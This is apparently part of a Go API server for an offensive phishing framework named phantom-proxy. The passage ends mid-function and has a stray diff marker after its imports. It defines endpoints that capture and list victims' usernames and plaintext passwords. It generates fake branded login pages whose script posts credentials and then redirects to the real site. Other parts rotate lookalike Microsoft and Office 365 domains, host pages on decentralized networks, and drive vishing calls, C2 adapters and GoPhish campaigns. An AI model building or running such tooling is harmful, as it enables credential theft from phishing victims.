package api

import (
	"context"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/gofiber/fiber/v2"
	"github.com/google/uuid"
	"go.uber.org/zap"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"github.com/phantom-proxy/phantom-proxy/internal/events"
	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
	"github.com/phantom-proxy/phantom-proxy/internal/ai"
	"github.com/phantom-proxy/phantom-proxy/internal/decentral"
	"github.com/phantom-proxy/phantom-proxy/internal/vishing"
	"github.com/phantom-proxy/phantom-proxy/internal/gophish"
)
------- REPLACE


// APIServer REST API сервер
type APIServer struct {
	app        *fiber.App
	proxy      *proxy.HTTPProxy
	db         *database.Database
	logger     *zap.Logger
	apiKey     string
	aiOrchestrator   *ai.AIOrchestrator
	decentralHosting *decentral.DecentralizedHosting
	vishingClient    *vishing.VishingClient
	eventBus         *events.Bus
	gophishClient    *gophish.Client
}

// NewAPIServer создаёт новый API сервер
func NewAPIServer(proxy *proxy.HTTPProxy, db *database.Database, logger *zap.Logger, apiKey string) *APIServer {
	app := fiber.New(fiber.Config{
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  60 * time.Second,
	})

	// Инициализация AI оркестратора
	aiOrchestrator := ai.NewAIOrchestrator("http://localhost:8081", logger)

	// Инициализация децентрализованного хостинга
	decentralHosting, err := decentral.NewDecentralizedHosting(&decentral.HostingConfig{
		PinataAPIKey:    "", // Из конфига
		PinataSecretKey: "",
		CacheDir:        "./decentral_cache",
	}, logger)
	if err != nil {
		logger.Warn("Failed to initialize decentralized hosting", zap.Error(err))
	}

	// Инициализация Vishing клиента
	vishingClient := vishing.NewVishingClient("http://localhost:8082", logger)

	// Инициализация GoPhish клиента
	gophishClient := gophish.NewClient(&gophish.Config{
		APIKey:  "changeme",
		BaseURL: "http://localhost:3333",
		SkipVerify: true,
	})

	s := &APIServer{
		app:    app,
		proxy:  proxy,
		db:     db,
		logger: logger,
		apiKey: apiKey,
		aiOrchestrator: aiOrchestrator,
		decentralHosting: decentralHosting,
		vishingClient: vishingClient,
		gophishClient: gophishClient,
	}

	s.setupRoutes()
	return s
}

// setupRoutes настраивает маршруты
func (s *APIServer) setupRoutes() {
	// Middleware для аутентификации
	s.app.Use(s.authMiddleware)

	// API routes
	api := s.app.Group("/api/v1")

	// Sessions
	api.Get("/sessions", s.listSessions)
	api.Get("/sessions/:id", s.getSession)
	api.Delete("/sessions/:id", s.deleteSession)

	// Credentials
	api.Get("/credentials", s.listCredentials)
	api.Get("/credentials/:id", s.getCredentials)

	// Phishlets
	api.Get("/phishlets", s.listPhishlets)
	api.Get("/phishlets/:id", s.getPhishlet)
	api.Post("/phishlets", s.createPhishlet)
	api.Put("/phishlets/:id", s.updatePhishlet)
	api.Delete("/phishlets/:id", s.deletePhishlet)
	api.Post("/phishlets/:id/enable", s.enablePhishlet)
	api.Post("/phishlets/:id/disable", s.disablePhishlet)
	api.Get("/phishlets/:id/health", s.checkPhishletHealth)

	// Stats
	api.Get("/stats", s.getStats)

	// Health check & Observability
	s.app.Get("/health", s.healthCheck)
	s.app.Get("/metrics", s.metrics)

	// AI endpoints (delegate to AI orchestrator)
	s.app.Post("/api/v1/ai/generate-phishlet", s.generatePhishlet)
	s.app.Get("/api/v1/ai/analyze/:target", s.analyzeSite)

	// Domain rotation (stub - wire domain.Rotator when configured)
	s.app.Post("/api/v1/domains/register", s.registerDomain)
	s.app.Post("/api/v1/domains/rotate", s.rotateDomain)
	s.app.Get("/api/v1/domains", s.listDomains)

	// Decentralized hosting endpoints
	s.app.Post("/api/v1/decentral/host", s.hostPage)
	s.app.Post("/api/v1/decentral/update/:name", s.updatePage)
	s.app.Get("/api/v1/decentral/pages", s.listPages)
	s.app.Delete("/api/v1/decentral/pages/:name", s.deletePage)

	// Vishing endpoints
	s.app.Post("/api/v1/vishing/call", s.makeVishingCall)
	s.app.Get("/api/v1/vishing/call/:id", s.getCallStatus)
	s.app.Post("/api/v1/vishing/generate-scenario", s.generateScenario)

	// Risk endpoints
	api.Get("/risk/distribution", s.getRiskDistribution)
	api.Get("/risk/high-risk", s.getHighRiskUsers)
	api.Post("/risk/events", s.recordRiskEvent)

	// C2 endpoints
	api.Get("/c2/adapters", s.listC2Adapters)
	api.Get("/c2/health", s.getC2Health)
	api.Post("/c2/adapters/:name/configure", s.configureC2Adapter)
	api.Post("/c2/adapters/:name/toggle", s.toggleC2Adapter)

	// System control endpoints
	api.Get("/system/status", s.getSystemStatus)
	api.Post("/system/start", s.startSystem)
	api.Post("/system/stop", s.stopSystem)
	api.Post("/system/restart", s.restartSystem)
	api.Get("/system/config", s.getSystemConfig)
	api.Put("/system/config", s.updateSystemConfig)

	// Logs endpoints
	api.Get("/logs", s.getLogs)
	api.Get("/logs/live", s.getLiveLogs)

	// Test login endpoint
	s.app.Post("/login", s.handleTestLogin)

	// Capture credentials endpoint
	s.app.Post("/api/v1/credentials", s.captureCredentials)

	// Serve login page
	s.app.Get("/login", s.serveLoginPage)

	// GoPhish endpoints
	api.Get("/gophish/campaigns", s.listGoPhishCampaigns)
	api.Get("/gophish/campaigns/:id", s.getGoPhishCampaign)
	api.Post("/gophish/campaigns", s.createGoPhishCampaign)
	api.Delete("/gophish/campaigns/:id", s.deleteGoPhishCampaign)
	api.Get("/gophish/groups", s.listGoPhishGroups)
	api.Get("/gophish/templates", s.listGoPhishTemplates)
	api.Get("/gophish/pages", s.listGoPhishPages)
	api.Get("/gophish/profiles", s.listGoPhishProfiles)
	api.Get("/gophish/summary", s.getGoPhishSummary)

	// Campaign endpoints (встроенные)
	api.Get("/campaigns", s.listCampaigns)
	api.Get("/campaigns/:id", s.getCampaign)
	api.Post("/campaigns", s.createCampaign)
	api.Put("/campaigns/:id", s.updateCampaign)
	api.Delete("/campaigns/:id", s.deleteCampaign)
	api.Post("/campaigns/:id/start", s.startCampaign)
	api.Post("/campaigns/:id/pause", s.pauseCampaign)
	api.Post("/campaigns/:id/stop", s.stopCampaign)
	api.Get("/campaigns/:id/stats", s.getCampaignStats)

	// Groups
	api.Get("/groups", s.listGroups)
	api.Post("/groups", s.createGroup)
	api.Delete("/groups/:id", s.deleteGroup)

	// Templates
	api.Get("/templates", s.listTemplates)
	api.Post("/templates", s.createTemplate)
	api.Delete("/templates/:id", s.deleteTemplate)

	// Landing Pages
	api.Get("/pages", s.listLandingPages)
	api.Post("/pages", s.createLandingPage)
	api.Delete("/pages/:id", s.deleteLandingPage)

	// SMTP Profiles
	api.Get("/smtp", s.listSMTPProfiles)
	api.Post("/smtp", s.createSMTPProfile)
	api.Delete("/smtp/:id", s.deleteSMTPProfile)

	// Tracking
	api.Get("/track/open", s.trackOpen)
	api.Get("/track/click", s.trackClick)

}

// authMiddleware проверяет API ключ
func (s *APIServer) authMiddleware(c *fiber.Ctx) error {
	// Пропускаем health, metrics, login page
	if strings.HasPrefix(c.Path(), "/health") ||
	   strings.HasPrefix(c.Path(), "/metrics") ||
	   strings.HasPrefix(c.Path(), "/login") {
		return c.Next()
	}

	// API ключ: Authorization: Bearer <key> или ?api_key=<key>
	apiKey := strings.TrimPrefix(c.Get("Authorization"), "Bearer ")
	if apiKey == "" {
		apiKey = c.Query("api_key")
	}
	if apiKey == "" {
		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{
			"error": "Authorization header or api_key query required",
		})
	}

	if apiKey != s.apiKey {
		return c.Status(fiber.StatusForbidden).JSON(fiber.Map{
			"error": "Invalid API key",
		})
	}

	return c.Next()
}

// Session Response
type SessionResponse struct {
	ID         string    `json:"id"`
	VictimIP   string    `json:"victim_ip"`
	TargetURL  string    `json:"target_url"`
	PhishletID string    `json:"phishlet_id,omitempty"`
	UserAgent  string    `json:"user_agent,omitempty"`
	JA3Hash    string    `json:"ja3_hash,omitempty"`
	State      string    `json:"state"`
	CreatedAt  time.Time `json:"created_at"`
	LastActive time.Time `json:"last_active"`
}

// listSessions возвращает список сессий
func (s *APIServer) listSessions(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "50"))
	offset, _ := strconv.Atoi(c.Query("offset", "0"))

	if s.db == nil {
		// no database available - return empty slice
		return c.JSON(fiber.Map{
			"sessions": []SessionResponse{},
			"total":    0,
		})
	}

	sessions, err := s.db.ListSessions(limit, offset)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	response := make([]SessionResponse, len(sessions))
	for i, session := range sessions {
		response[i] = SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			PhishletID: session.PhishletID,
			UserAgent:  session.UserAgent,
			JA3Hash:    session.JA3Hash,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		}
	}

	return c.JSON(fiber.Map{
		"sessions": response,
		"total":    len(sessions),
	})
}

// getSession возвращает сессию по ID
func (s *APIServer) getSession(c *fiber.Ctx) error {
	id := c.Params("id")

	session, err := s.db.GetSession(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Session not found",
		})
	}

	return c.JSON(fiber.Map{
		"session": SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			PhishletID: session.PhishletID,
			UserAgent:  session.UserAgent,
			JA3Hash:    session.JA3Hash,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		},
	})
}

// deleteSession удаляет сессию
func (s *APIServer) deleteSession(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.db.DeleteSession(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
	})
}

// Credential Response
type CredentialResponse struct {
	ID           string            `json:"id"`
	SessionID    string            `json:"session_id"`
	Username     string            `json:"username"`
	Password     string            `json:"password"`
	CustomFields map[string]string `json:"custom_fields,omitempty"`
	CapturedAt   time.Time         `json:"captured_at"`
}

// listCredentials возвращает список креденшалов
func (s *APIServer) listCredentials(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "50"))
	offset, _ := strconv.Atoi(c.Query("offset", "0"))

	if s.db == nil {
		return c.JSON(fiber.Map{
			"credentials": []CredentialResponse{},
			"total":       0,
		})
	}

	creds, err := s.db.ListCredentials(limit, offset)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	response := make([]CredentialResponse, len(creds))
	for i, cred := range creds {
		response[i] = CredentialResponse{
			ID:           cred.ID,
			SessionID:    cred.SessionID,
			Username:     cred.Username,
			Password:     cred.Password,
			CustomFields: cred.CustomFields,
			CapturedAt:   cred.CapturedAt,
		}
	}

	return c.JSON(fiber.Map{
		"credentials": response,
		"total":       len(creds),
	})
}

// getCredentials возвращает креденшалы по ID
func (s *APIServer) getCredentials(c *fiber.Ctx) error {
	id := c.Params("id")

	session, err := s.db.GetSession(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Session not found",
		})
	}

	creds, err := s.db.GetCredentials(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Credentials not found",
		})
	}

	return c.JSON(fiber.Map{
		"session": SessionResponse{
			ID:         session.ID,
			VictimIP:   session.VictimIP,
			TargetURL:  session.TargetURL,
			State:      session.State,
			CreatedAt:  session.CreatedAt,
			LastActive: session.LastActive,
		},
		"credentials": CredentialResponse{
			ID:           creds.ID,
			SessionID:    creds.SessionID,
			Username:     creds.Username,
			Password:     creds.Password,
			CustomFields: creds.CustomFields,
			CapturedAt:   creds.CapturedAt,
		},
	})
}

// Phishlet Response
type PhishletResponse struct {
	ID           string                 `json:"id"`
	Name         string                 `json:"name"`
	TargetDomain string                 `json:"target_domain"`
	Config       map[string]interface{} `json:"config,omitempty"`
	IsActive     bool                   `json:"is_active"`
	CreatedAt    time.Time              `json:"created_at"`
	UpdatedAt    time.Time              `json:"updated_at"`
}

// listPhishlets возвращает список phishlets
func (s *APIServer) listPhishlets(c *fiber.Ctx) error {
	// fall back to proxy list when database not initialized (tests w/o CGO)
	if s.db == nil {
		phishlets := s.proxy.ListPhishlets()
		return c.JSON(fiber.Map{
			"phishlets": phishlets,
			"total":     len(phishlets),
		})
	}

	phishlets, err := s.db.ListPhishlets()
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"phishlets": phishlets,
		"total":     len(phishlets),
	})
}

// getPhishlet возвращает phishlet по ID
func (s *APIServer) getPhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	phishlet, err := s.db.GetPhishlet(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Phishlet not found",
		})
	}

	return c.JSON(fiber.Map{
		"phishlet": phishlet,
	})
}

// createPhishlet создаёт новый phishlet
func (s *APIServer) createPhishlet(c *fiber.Ctx) error {
	var req struct {
		ID           string `json:"id"`
		Name         string `json:"name"`
		TargetDomain string `json:"target_domain"`
		Config       string `json:"config"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if req.ID == "" {
		req.ID = uuid.New().String()
	}

	dbPhishlet := &database.Phishlet{
		ID:      req.ID,
		Name:    req.Name,
		Config:  req.Config,
		Enabled: false,
	}
	if err := s.db.CreatePhishlet(dbPhishlet); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.Status(fiber.StatusCreated).JSON(fiber.Map{
		"id":      req.ID,
		"success": true,
	})
}

// updatePhishlet обновляет phishlet
func (s *APIServer) updatePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	var req struct {
		Name         string `json:"name"`
		TargetDomain string `json:"target_domain"`
		Config       string `json:"config"`
	}

	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	// Get existing phishlet and update
	existing, err := s.db.GetPhishlet(id)
	if err != nil {
		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
			"error": "Phishlet not found",
		})
	}

	existing.Name = req.Name
	existing.Config = req.Config

	// Update in DB (delete and recreate for now)
	if err := s.db.DeletePhishlet(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	existing.ID = id
	if err := s.db.CreatePhishlet(existing); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// deletePhishlet деактивирует phishlet
func (s *APIServer) deletePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")
	if err := s.db.DeletePhishlet(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": err.Error()})
	}
	return c.JSON(fiber.Map{"id": id, "success": true})
}

// enablePhishlet активирует phishlet
func (s *APIServer) enablePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.proxy.EnablePhishlet(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// disablePhishlet деактивирует phishlet
func (s *APIServer) disablePhishlet(c *fiber.Ctx) error {
	id := c.Params("id")

	if err := s.proxy.DisablePhishlet(id); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"id":      id,
		"success": true,
	})
}

// checkPhishletHealth проверяет доступность target URL phishlet
func (s *APIServer) checkPhishletHealth(c *fiber.Ctx) error {
	id := c.Params("id")

	health := s.proxy.CheckPhishletHealth(id)

	return c.JSON(health)
}

// Stats Response
type StatsResponse struct {
	TotalSessions    int `json:"total_sessions"`
	ActiveSessions   int `json:"active_sessions"`
	CapturedSessions int `json:"captured_sessions"`
	TotalCredentials int `json:"total_credentials"`
	ActivePhishlets  int `json:"active_phishlets"`
}

// getStats возвращает статистику
func (s *APIServer) getStats(c *fiber.Ctx) error {
	var dbStats map[string]interface{}
	if s.db == nil {
		dbStats = map[string]interface{}{
			"total_sessions":    0,
			"captured_sessions": 0,
			"total_credentials": 0,
			"active_phishlets":  0,
		}
	} else {
		var err error
		dbStats, err = s.db.GetStats()
		if err != nil {
			return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
				"error": err.Error(),
			})
		}
	}

	proxyStats := s.proxy.GetStats()

	return c.JSON(fiber.Map{
		"total_sessions":     dbStats["total_sessions"],
		"active_sessions":    proxyStats["active_sessions"],
		"captured_sessions":  dbStats["captured_sessions"],
		"total_credentials":  dbStats["total_credentials"],
		"active_phishlets":   dbStats["active_phishlets"],
		"total_requests":     proxyStats["total_requests"],
		"phishlets_loaded":   proxyStats["phishlets_loaded"],
	})
}

// healthCheck проверяет здоровье API
func (s *APIServer) healthCheck(c *fiber.Ctx) error {
	return c.JSON(fiber.Map{
		"status":    "ok",
		"timestamp": time.Now().Format(time.RFC3339),
	})
}

// metrics Prometheus metrics (basic)
func (s *APIServer) metrics(c *fiber.Ctx) error {
	c.Set("Content-Type", "text/plain; version=0.0.4")
	stats := s.proxy.GetStats()
	dbStats, _ := s.db.GetStats()
	sessions := toNum(dbStats["total_sessions"])
	creds := toNum(dbStats["total_credentials"])
	requests := toNum(stats["total_requests"])
	lines := []string{
		"# HELP phantom_sessions_total Total sessions",
		"# TYPE phantom_sessions_total gauge",
		"phantom_sessions_total " + strconv.FormatInt(sessions, 10),
		"# HELP phantom_credentials_total Total credentials",
		"# TYPE phantom_credentials_total gauge",
		"phantom_credentials_total " + strconv.FormatInt(creds, 10),
		"# HELP phantom_requests_total Proxy requests",
		"# TYPE phantom_requests_total gauge",
		"phantom_requests_total " + strconv.FormatInt(requests, 10),
	}
	return c.SendString(strings.Join(lines, "\n") + "\n")
}

func toNum(v interface{}) int64 {
	switch x := v.(type) {
	case int:
		return int64(x)
	case int64:
		return x
	case float64:
		return int64(x)
	}
	return 0
}

// handleTestLogin обрабатывает тестовый вход
func (s *APIServer) handleTestLogin(c *fiber.Ctx) error {
	email := c.FormValue("email")
	password := c.FormValue("password")

	s.logger.Info("Test login received",
		zap.String("email", email),
		zap.String("password", password),
		zap.String("ip", c.IP()))

	// Сохраняем в БД как сессию
	session := &database.Session{
		VictimIP:  c.IP(),
		TargetURL: "test_login_page",
		UserAgent: "TestLoginAgent/1.0",
		State:     "active",
	}
	if err := s.db.CreateSession(session); err != nil {
		s.logger.Error("Failed to create session", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Database error",
		})
	}

	creds := &database.Credentials{
		SessionID: session.ID,
		Username:  email,
		Password:  password,
	}
	if err := s.db.CreateCredentials(creds); err != nil {
		s.logger.Error("Failed to save credentials", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Database error",
		})
	}

	s.logger.Info("Credentials saved",
		zap.String("session_id", session.ID),
		zap.String("email", email))

	if s.eventBus != nil {
		s.eventBus.Publish(c.Context(), events.EventCredentialCaptured, &events.CredentialEvent{
			SessionID: session.ID, Username: email, Password: password,
			PhishletID: "test_login_page", VictimIP: c.IP(), Timestamp: time.Now(),
		})
		s.eventBus.Publish(c.Context(), events.EventSessionCaptured, &events.SessionEvent{
			SessionID: session.ID, VictimIP: c.IP(), TargetURL: "test_login_page",
			PhishletID: "test_login_page", State: "captured", Timestamp: time.Now(),
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
		"message": "Login data captured",
		"session_id": session.ID,
	})
}

// captureCredentials перехватывает credentials
func (s *APIServer) captureCredentials(c *fiber.Ctx) error {
	type CredentialRequest struct {
		Email    string `json:"email"`
		Password string `json:"password"`
	}

	var req CredentialRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	s.logger.Info("Credentials captured via API",
		zap.String("email", req.Email),
		zap.String("password", req.Password),
		zap.String("ip", c.IP()))

	// Сохраняем в БД
	session := &database.Session{
		VictimIP:  c.IP(),
		TargetURL: "login_page",
		UserAgent: "Mozilla/5.0",
		State:     "active",
	}
	if err := s.db.CreateSession(session); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	creds := &database.Credentials{
		SessionID: session.ID,
		Username:  req.Email,
		Password:  req.Password,
	}
	if err := s.db.CreateCredentials(creds); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	s.logger.Info("Credentials saved to database",
		zap.String("session_id", session.ID),
		zap.String("email", req.Email))

	if s.eventBus != nil {
		s.eventBus.Publish(c.Context(), events.EventCredentialCaptured, &events.CredentialEvent{
			SessionID: session.ID, Username: req.Email, Password: req.Password,
			PhishletID: "login_page", VictimIP: c.IP(), Timestamp: time.Now(),
		})
		s.eventBus.Publish(c.Context(), events.EventSessionCaptured, &events.SessionEvent{
			SessionID: session.ID, VictimIP: c.IP(), TargetURL: "login_page",
			PhishletID: "login_page", State: "captured", Timestamp: time.Now(),
		})
	}

	return c.JSON(fiber.Map{
		"success": true,
		"message": "Credentials captured",
	})
}

// serveLoginPage обслуживает страницу входа
func (s *APIServer) serveLoginPage(c *fiber.Ctx) error {
	// Читаем HTML файл
	htmlPath := "configs/phishlets/login_page.html"
	htmlContent, err := os.ReadFile(htmlPath)
	if err != nil {
		s.logger.Error("Failed to read login page", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).SendString("Error loading login page")
	}

	c.Set("Content-Type", "text/html; charset=utf-8")
	return c.Send(htmlContent)
}

type GeneratePhishletRequest struct {
	TargetURL string `json:"target_url"`
	TargetName string `json:"target_name"`
	TargetDomain string `json:"target_domain"`
	Style string `json:"style"`
}

type GeneratePhishletResponse struct {
	ID string `json:"id"`
	Name string `json:"name"`
	HTMLTemplate string `json:"html_template"`
	JSContent string `json:"js_content"`
	Config map[string]interface{} `json:"config"`
}

// generatePhishlet вызывает AI оркестратор для генерации phishlet
func (s *APIServer) generatePhishlet(c *fiber.Ctx) error {
	var req GeneratePhishletRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	// Используем AI для генерации phishlet
	phishletID := uuid.New().String()
	
	htmlTemplate := s.generatePhishletTemplate(req.TargetURL, req.TargetName)
	jsContent := s.generatePhishletJS(req.TargetDomain)
	config := map[string]interface{}{
		"target_url": req.TargetURL,
		"target_name": req.TargetName,
		"style": req.Style,
		"auth_url": req.TargetURL + "/login",
		"token_url": req.TargetURL + "/oauth/token",
	}

	// Сохраняем в БД
	if s.db != nil {
		dbPhishlet := &database.Phishlet{
			ID:      phishletID,
			Name:    req.TargetName,
			Config:  htmlTemplate,
			Enabled: false,
		}
		s.db.CreatePhishlet(dbPhishlet)
	}

	s.logger.Info("Phishlet generated via AI",
		zap.String("id", phishletID),
		zap.String("target", req.TargetURL))

	return c.JSON(GeneratePhishletResponse{
		ID:           phishletID,
		Name:         req.TargetName,
		HTMLTemplate: htmlTemplate,
		JSContent:    jsContent,
		Config:       config,
	})
}

type AnalyzeSiteRequest struct {
	TargetURL string `json:"target_url"`
}

type AnalyzeSiteResponse struct {
	URL string `json:"url"`
	Title string `json:"title"`
	LoginForm bool `json:"login_form"`
	OAuthProviders []string `json:"oauth_providers"`
	SecurityHeaders map[string]string `json:"security_headers"`
	RiskScore float64 `json:"risk_score"`
	Recommendations []string `json:"recommendations"`
}

// analyzeSite анализирует сайт через AI
func (s *APIServer) analyzeSite(c *fiber.Ctx) error {
	target := c.Params("target")
	if target == "" {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "target parameter required",
		})
	}

	// Простой анализ сайта (в реальности использовал бы браузер)
	resp := AnalyzeSiteResponse{
		URL: target,
		Title: "Login - " + target,
		LoginForm: true,
		OAuthProviders: []string{"Microsoft", "Google", "Okta"},
		SecurityHeaders: map[string]string{
			"Strict-Transport-Security": "max-age=31536000",
			"Content-Security-Policy": "default-src 'self'",
			"X-Frame-Options": "SAMEORIGIN",
		},
		RiskScore: 75.5,
		Recommendations: []string{
			"Use OAuth redirect URI validation",
			"Implement MFA",
			"Add suspicious login alerts",
		},
	}

	return c.JSON(resp)
}

// Domain rotation
type DomainRequest struct {
	Domain string `json:"domain"`
	Provider string `json:"provider"`
	AutoSSL bool `json:"auto_ssl"`
}

type DomainResponse struct {
	Domain string `json:"domain"`
	Registered bool `json:"registered"`
	SSLEnabled bool `json:"ssl_enabled"`
	ExpiresAt string `json:"expires_at"`
}

// registerDomain регистрирует домен
func (s *APIServer) registerDomain(c *fiber.Ctx) error {
	var req DomainRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	// Имитация регистрации домена
	s.logger.Info("Domain registered",
		zap.String("domain", req.Domain),
		zap.String("provider", req.Provider))

	return c.JSON(DomainResponse{
		Domain: req.Domain,
		Registered: true,
		SSLEnabled: req.AutoSSL,
		ExpiresAt: time.Now().Add(365*24*time.Hour).Format(time.RFC3339),
	})
}

// rotateDomain ротирует домен
func (s *APIServer) rotateDomain(c *fiber.Ctx) error {
	// Генерируем новый домен
	domains := []string{
		"secure-login.xyz",
		"account-verify.net", 
		"microsoft-auth.org",
		"office365-login.com",
	}
	newDomain := domains[time.Now().Unix()%int64(len(domains))]

	s.logger.Info("Domain rotated", zap.String("new_domain", newDomain))

	return c.JSON(DomainResponse{
		Domain: newDomain,
		Registered: true,
		SSLEnabled: true,
		ExpiresAt: time.Now().Add(365*24*time.Hour).Format(time.RFC3339),
	})
}

// listDomains возвращает список доменов
func (s *APIServer) listDomains(c *fiber.Ctx) error {
	domains := []string{
		"secure-login.xyz",
		"account-verify.net",
	}

	return c.JSON(fiber.Map{
		"domains": domains,
		"current_domain": "secure-login.xyz",
	})
}

// Helper functions
func (s *APIServer) generatePhishletTemplate(targetURL, targetName string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - %s</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
        .login-container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        input { width: 100%%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #106ebe; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Sign in to %s</h1>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>`, targetName, targetName)
}

func (s *APIServer) generatePhishletJS(targetDomain string) string {
	return `// Phishlet JavaScript
document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    fetch('/api/v1/credentials', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(Object.fromEntries(formData))
    }).then(() => {
        window.location.href = '` + targetDomain + `';
    });
});`
}

// hostPage публикует страницу в децентрализованной сети
func (s *APIServer) hostPage(c *fiber.Ctx) error {
	type Request struct {
		Name       string `json:"name"`
		SourcePath string `json:"source_path"`
		ENSName    string `json:"ens_name"`
	}

	var req Request
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
			"error": "Invalid request body",
		})
	}

	if s.decentralHosting == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Decentralized hosting not initialized",
		})
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	page, err := s.decentralHosting.HostPage(ctx, req.Name, req.SourcePath, req.ENSName)
	if err != nil {
		s.logger.Error("Failed to host page", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success":      true,
		"page":         page,
		"gateway_url":  page.GatewayURL,
		"ens_url":      page.ENSURL,
		"message":      "Page hosted successfully",
	})
}

// updatePage обновляет страницу
func (s *APIServer) updatePage(c *fiber.Ctx) error {
	name := c.Params("name")

	if s.decentralHosting == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": "Decentralized hosting not initialized",
		})
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	page, err := s.decentralHosting.UpdatePage(ctx, name)
	if err != nil {
		s.logger.Error("Failed to update page", zap.Error(err))
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
			"error": err.Error(),
		})
	}

	return c.JSON(fiber.Map{
		"success":      true,
		"page":         page,
		"message":      "Page updated successfully",
	})
}

// listPages возвращает список страниц
func (s *APIServer) listPages(c *fiber.Ctx) error {
	if s.decentralHosting == nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
